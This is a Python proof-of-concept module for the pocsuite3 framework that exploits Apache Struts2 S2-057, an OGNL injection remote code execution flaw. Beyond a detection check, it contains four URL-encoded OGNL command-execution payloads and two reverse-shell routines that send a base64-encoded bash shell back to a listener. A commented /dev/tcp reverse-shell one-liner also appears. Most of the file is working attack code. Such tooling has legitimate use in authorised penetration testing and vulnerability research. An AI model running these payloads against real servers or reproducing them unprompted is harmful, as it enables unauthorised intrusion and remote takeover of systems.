"""
If you have issues about development, please read:
https://github.com/knownsec/pocsuite3/blob/master/docs/CODING.md
for more about information, plz visit http://pocsuite.org
"""
import base64
import random
import re
import urllib
from urllib.parse import urlparse, quote

from pocsuite3.api import Output, POCBase, register_poc, logger, requests, get_listener_ip, get_listener_port
from pocsuite3.lib.core.interpreter_option import OptString
from pocsuite3.modules.listener import REVERSE_PAYLOAD


class DemoPOC(POCBase):
    vulID = '97497'  # ssvid
    version = '3.0'
    author = ['wusl@knownsec.com']
    vulDate = '2019-2-12'
    createDate = '2019-2-12'
    updateDate = '2019-2-12'
    references = ['https://www.seebug.org/vuldb/ssvid-97497']
    name = 'Apache Struts2 s2-057 exploit for mac'
    appPowerLink = ''
    appName = 'Apache Struts2'
    appVersion = '2.3.5-2.3.34, 2.5-2.5.16'
    vulType = 'Remote command execute'
    desc = '''
    Struts2在XML配置中如果namespace值未设置且（Action Configuration）中未设置
    或用通配符namespace时可能会导致远程代码执行，当url标签未设置value和action值
    且上层动作未设置或用通配符namespace时也可能会导致远程代码执行
    '''
    samples = []
    install_requires = ['']

    def _options(self):
        cmd = OptString('whoami', '任意执行的命令')
        return {'cmd': cmd}

    def _verify(self):
        result = {}

        try:
            num_1 = random.randint(000000000, 999999999)
            num_2 = random.randint(000000000, 999999999)
            flag = str(num_1 + num_2)
            payload = "%24{{{0}+{1}}}".format(str(num_1), str(num_2))
            pr = urlparse(self.url)
            if not pr.path.endswith('.action'):
                resp = requests.get(self.url)
                matchs = re.findall(r'<a.{0,30}?href="(/.*?\.action)"', resp.text)
                if matchs:
                    temp_path = matchs[0].split("/")
                    temp_path.insert(-1, payload)
                    vul_path = "/".join(temp_path)
                    vuln_url = "{0}://{1}/{2}".format(pr.scheme, pr.netloc, vul_path)
                else:
                    temp_path = pr.path.split("/")[:-1]
                    temp_path.append(payload)
                    temp_path.append("index.action")
                    vul_path = "/".join(temp_path)
                    vuln_url = "{0}://{1}/{2}".format(pr.scheme, pr.netloc, vul_path)
            else:
                temp_path = pr.path.split("/")
                temp_path.insert(-1, payload)
                vul_path = "/".join(temp_path)
                vuln_url = "{0}://{1}/{2}".format(pr.scheme, pr.netloc, vul_path)

            resp = requests.get(vuln_url, allow_redirects=True)
            if resp and resp.status_code in (200, 302) and (
                    flag in resp.text or flag in resp.headers.get("location", "")):
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = vuln_url
        except Exception as e:
            logger.exception(e)
        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output

    def _attack(self):
        exec_payload1 = "%24%7B%28%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23a%3D@java.lang.Runtime@getRuntime%28%29.exec%28%27{cmd}%27%29.getInputStream%28%29%2C%23b%3Dnew%20java.io.InputStreamReader%28%23a%29%2C%23c%3Dnew%20%20java.io.BufferedReader%28%23b%29%2C%23d%3Dnew%20char%5B51020%5D%2C%23c.read%28%23d%29%2C%23sbtest%3D@org.apache.struts2.ServletActionContext@getResponse%28%29.getWriter%28%29%2C%23sbtest.println%28%23d%29%2C%23sbtest.close%28%29%29%7D"
        exec_payload2 = "%24%7B%28%23_memberAccess%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23w%3D%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%29.%28%23w.print%28@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27{cmd}%27%29.getInputStream%28%29%29%29%29.%28%23w.close%28%29%29%7D"
        exec_payload3 = "%24%7B%28%23dm%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23ct%3D%23request%5B%27struts.valueStack%27%5D.context%29.%28%23cr%3D%23ct%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ou%3D%23cr.getInstance%28@com.opensymphony.xwork2.ognl.OgnlUtil@class%29%29.%28%23ou.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ou.getExcludedClasses%28%29.clear%28%29%29.%28%23ct.setMemberAccess%28%23dm%29%29.%28%23w%3D%23ct.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%29.%28%23w.print%28@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27{cmd}%27%29.getInputStream%28%29%29%29%29.%28%23w.close%28%29%29%7D"
        exec_payload4 = "%24%7B%0A%28%23dm%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23ct%3D%23request%5B%27struts.valueStack%27%5D.context%29.%28%23cr%3D%23ct%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ou%3D%23cr.getInstance%28@com.opensymphony.xwork2.ognl.OgnlUtil@class%29%29.%28%23ou.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ou.getExcludedClasses%28%29.clear%28%29%29.%28%23ct.setMemberAccess%28%23dm%29%29.%28%23a%3D@java.lang.Runtime@getRuntime%28%29.exec%28%27{cmd}%27%29%29.%28@org.apache.commons.io.IOUtils@toString%28%23a.getInputStream%28%29%29%29%7D"

        shell = "bash -c {echo,SHELL}|{base64,-d}|{bash,-i}"
        pr = urlparse(self.url)
        temp_path = pr.path.split("/")

        prefix = "{0}://{1}{2}".format(pr.scheme, pr.netloc, '/'.join(temp_path[:-1]))
        suffix = temp_path[-1]

        """选择可用的exp"""
        payloads = [exec_payload1, exec_payload2, exec_payload3, exec_payload4]
        hash_str = 'test123_404aabbcc'
        new_exp = ''
        for exp in payloads:
            payload = exp.format(cmd=quote("echo " + hash_str))
            url = prefix + "/" + payload + "/" + suffix
            try:
                resp = requests.get(url, allow_redirects=True)
                if hash_str in resp.text:
                    new_exp = exp
                    break
            except Exception as e:
                print(e)
                resp = ''

        if new_exp == '':
            return False

        # cmd = "bash -i >& /dev/tcp/{ip}/{port} 0>&1".format(ip=ip, port=port)
        # cmd = base64.b64encode(cmd.encode()).decode()
        # shell = self.shell.replace('SHELL', cmd)
        cmd = self.get_option("cmd")
        payload = new_exp.format(cmd=quote(cmd))
        url = prefix + "/" + payload + "/" + suffix
        try:
            resp = requests.get(url, allow_redirects=True)
        except Exception as e:
            return False
        return resp.text

    def _shell(self):
        exec_payload1 = "%24%7B%28%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23a%3D@java.lang.Runtime@getRuntime%28%29.exec%28%27{cmd}%27%29.getInputStream%28%29%2C%23b%3Dnew%20java.io.InputStreamReader%28%23a%29%2C%23c%3Dnew%20%20java.io.BufferedReader%28%23b%29%2C%23d%3Dnew%20char%5B51020%5D%2C%23c.read%28%23d%29%2C%23sbtest%3D@org.apache.struts2.ServletActionContext@getResponse%28%29.getWriter%28%29%2C%23sbtest.println%28%23d%29%2C%23sbtest.close%28%29%29%7D"
        exec_payload2 = "%24%7B%28%23_memberAccess%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23w%3D%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%29.%28%23w.print%28@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27{cmd}%27%29.getInputStream%28%29%29%29%29.%28%23w.close%28%29%29%7D"
        exec_payload3 = "%24%7B%28%23dm%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23ct%3D%23request%5B%27struts.valueStack%27%5D.context%29.%28%23cr%3D%23ct%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ou%3D%23cr.getInstance%28@com.opensymphony.xwork2.ognl.OgnlUtil@class%29%29.%28%23ou.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ou.getExcludedClasses%28%29.clear%28%29%29.%28%23ct.setMemberAccess%28%23dm%29%29.%28%23w%3D%23ct.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%29.%28%23w.print%28@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27{cmd}%27%29.getInputStream%28%29%29%29%29.%28%23w.close%28%29%29%7D"
        exec_payload4 = "%24%7B%0A%28%23dm%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23ct%3D%23request%5B%27struts.valueStack%27%5D.context%29.%28%23cr%3D%23ct%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ou%3D%23cr.getInstance%28@com.opensymphony.xwork2.ognl.OgnlUtil@class%29%29.%28%23ou.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ou.getExcludedClasses%28%29.clear%28%29%29.%28%23ct.setMemberAccess%28%23dm%29%29.%28%23a%3D@java.lang.Runtime@getRuntime%28%29.exec%28%27{cmd}%27%29%29.%28@org.apache.commons.io.IOUtils@toString%28%23a.getInputStream%28%29%29%29%7D"
        shell = "bash -c {echo,SHELL}|{base64,-D}|{bash,-i}"
        pr = urlparse(self.url)
        temp_path = pr.path.split("/")

        prefix = "{0}://{1}{2}".format(pr.scheme, pr.netloc, '/'.join(temp_path[:-1]))
        suffix = temp_path[-1]

        """选择可用的exp"""
        payloads = [exec_payload1, exec_payload2, exec_payload3, exec_payload4]
        hash_str = 'test123_404aabbcc'
        new_exp = ''
        for exp in payloads:
            payload = exp.format(cmd=quote("echo " + hash_str))
            url = prefix + "/" + payload + "/" + suffix
            try:
                resp = requests.get(url, allow_redirects=True)
                if hash_str in resp.text:
                    new_exp = exp
                    break
            except Exception as e:
                pass
        if new_exp == '':
            return False
        cmd = REVERSE_PAYLOAD.BASH.format(get_listener_ip(), get_listener_port())

        cmd = base64.b64encode(cmd.encode()).decode()
        shell = shell.replace('SHELL', cmd)
        # cmd = self.get_option("cmd")
        # shell = cmd
        payload = new_exp.format(cmd=quote(shell))
        url = prefix + "/" + payload + "/" + suffix
        try:
            resp = requests.get(url, allow_redirects=True)
        except:
            resp = ''

    def _shell2(self):
        command = REVERSE_PAYLOAD.BASH.format(get_listener_ip(), get_listener_port())

        ognl_payload = "${"
        ognl_payload += "(#_memberAccess['allowStaticMethodAccess']=true)."
        ognl_payload += "(#cmd='{}').".format(command)
        ognl_payload += "(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))."
        ognl_payload += "(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'bash','-c',#cmd}))."
        ognl_payload += "(#p=new java.lang.ProcessBuilder(#cmds))."
        ognl_payload += "(#p.redirectErrorStream(true))."
        ognl_payload += "(#process=#p.start())."
        ognl_payload += "(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))."
        ognl_payload += "(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))."
        ognl_payload += "(#ros.flush())"
        ognl_payload += "}"

        ognl_payload = urllib.parse.quote_plus(ognl_payload)
        ognl_payload.replace("+", "%20").replace(" ", "%20").replace("%2F", "/")

        try:
            pr = urlparse(self.url)
            if not pr.path.endswith('.action'):
                resp = requests.get(self.url)
                matchs = re.findall(r'<a.{0,30}?href="(/.*?\.action)"', resp.text)
                if matchs:
                    temp_path = matchs[0].strip('/')
                    url = '{}://{}/{}/{}'.format(pr.scheme, pr.netloc, '{}', temp_path)
                else:
                    url = '{}://{}/{}/{}'.format(pr.scheme, pr.netloc, '{}', 'index.action')
            else:
                url = '{}://{}/{}/{}'.format(pr.scheme, pr.netloc, '{}', pr.path.split('/')[-1])
            requests.get(url.format(ognl_payload))
        except Exception as e:
            logger.error(str(e))


register_poc(DemoPOC)
